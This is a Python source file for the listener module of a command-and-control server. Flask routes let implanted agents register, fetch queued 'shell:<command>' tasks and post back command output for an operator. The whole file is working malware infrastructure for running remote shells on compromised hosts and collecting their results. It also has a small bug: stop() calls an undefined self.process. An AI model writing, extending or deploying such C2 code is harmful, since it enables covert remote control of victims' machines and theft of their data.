import os
import json
import random
from task import TaskShell
from agent import Agent
from database import Database
from flask import Flask, request, jsonify
from multiprocessing import Process
import sys
import threading
import logging

class Listener:
    """
    Listener is a socket that can manage multiple agent. It's used to communicate with agents, send task, register agent, receive task result...
    C2 server can have multiple listener.

    Params:
        name:String -> listener's name.
        port:String -> listener's port.
        ipaddress:String -> listener's ip address.
    """
    def __init__(self, name, port, ipaddress):
        self.name = name
        self.port = port
        self.ipaddress = ipaddress
        # Define the directory paths for listener data
        self.Path = "data/listeners/{}/".format(self.name)
        self.keyPath = "{}key".format(self.Path)
        self.filePath = "{}files/".format(self.Path)
        self.agentsPath = "{}agents/".format(self.Path)
        self.app = Flask(__name__)
        self.isRunning = False
        self.daemon = None

        # Create directories if they don't exist
        if not os.path.exists(self.Path):
            os.makedirs(self.Path)
        if not os.path.exists(self.agentsPath):
            os.makedirs(self.agentsPath)
        if not os.path.exists(self.filePath):
            os.makedirs(self.filePath)

        self.database = Database()
        self.agentsList = self.database.getAgents()

    def setAgentsList(self, agentsList):
        """
        Methods used to set the list of agents managed by the listener.

        Params:
            agentsList:Agent[] -> list of agents object.
        """
        self.agentsList = agentsList

    def getAgentsList(self):
        """
        Methods used to retrieve agents managed by the listener.

        Returns: 
            agentsList:Agent[] -> list of agents object.
        """
        return self.agentsList

    def getName(self):
        """
        Methods used to get listener's name.
        """
        return self.name
    
    def getIp(self):
        """
        Methods used to get listener's ip.
        """
        return self.ipaddress

    def getPort(self):
        """
        Methods used to get listener's port.
        """
        return self.port

    def run(self):
        """
        This method need to be called once. It's setup all route used by the listener.
        
        Routes :
            /register -> agent send POST request to this endpoint to be registered.
            The POST request contains json datatype with this format : 
                {
                    "name": "example",
                    "ip": "1.1.1.1",
                    "hostname": "DESKTOP-ABC",
                    "key": "1234"
                }
            /getTask?agent=name -> agent send GET request to retrieve his assigned task on text format. Tasks now are just command. Tasks are send with this format :
                shell:<command>
            /receiveResult -> agent send POST request to this endpoint to send their task result in json format : 
                {
                    "agent":"agentName",
                    "result":"task result"
                }
            /showResult?agent=name -> CLI or Web Interface use this endpoint to retrieve the task result of an agent. This endpoint can return 204 with result not already receive or 200 with the result.
        """
        @self.app.route('/register', methods=['POST'])
        def register_agent():
            res = request.json
            print(res)
            agent = Agent(res.get('name'), res.get('ip'), res.get('hostname'), res.get('key'), '{}{}/'.format(self.agentsPath, res.get('name')), self.name)
            self.database.setAgent(agent)
            
            return(res.get('name'),200)

        @self.app.route('/getTask', methods=['GET'])
        def get_task():
            agentName = request.args.get('agent')
            
            try:
                with open('{}{}/task'.format(self.agentsPath, agentName), 'r') as f:
                    task = f.read()
            except FileNotFoundError:
                return("[Listener] Agent doesn't have task !", 204)
            except KeyError:
                return("[Listener] Agent not registered !", 404)

            if task == "":
                return("", 204)
            else:
                return(task, 200)

        @self.app.route('/receiveResult', methods=['POST'])
        def post_result():
            res = request.json
            agentName = res.get('agent')
            result = res.get('result')

            try:
                task = self.agentsList[agentName].getTask()
            except KeyError:
                return("[Listener] Agent not registered !", 404)

            task.receiveResult(result)

            return("ok",200)
        
        @self.app.route('/showResult', methods=['GET'])
        def get_result():
            agentName = request.args.get('agent')

            try:
                task = self.agentsList[agentName].getTask()
            except KeyError:
                return("[Listener] Agent not registered !", 404)

            result = task.getResult()

            if result == "":
                return("[Listener] Result not receive", 204)
            else:
                task.clearTask()
                return(result, 200)

        self.app.run(host=self.ipaddress, port=self.port)
    
    def start(self):
        """
        Methods used to start a new daemon that contains the Flask instance for one listener.
        """
        self.daemon = threading.Thread(name=self.name, target=self.run, daemon=True)
        self.daemon.daemon = True
        self.daemon.start()
        self.isRunning = True

    def stop(self):
        """
        Methods used to stop a daemon.
        """
        self.process.terminate()
        self.isRunning = False
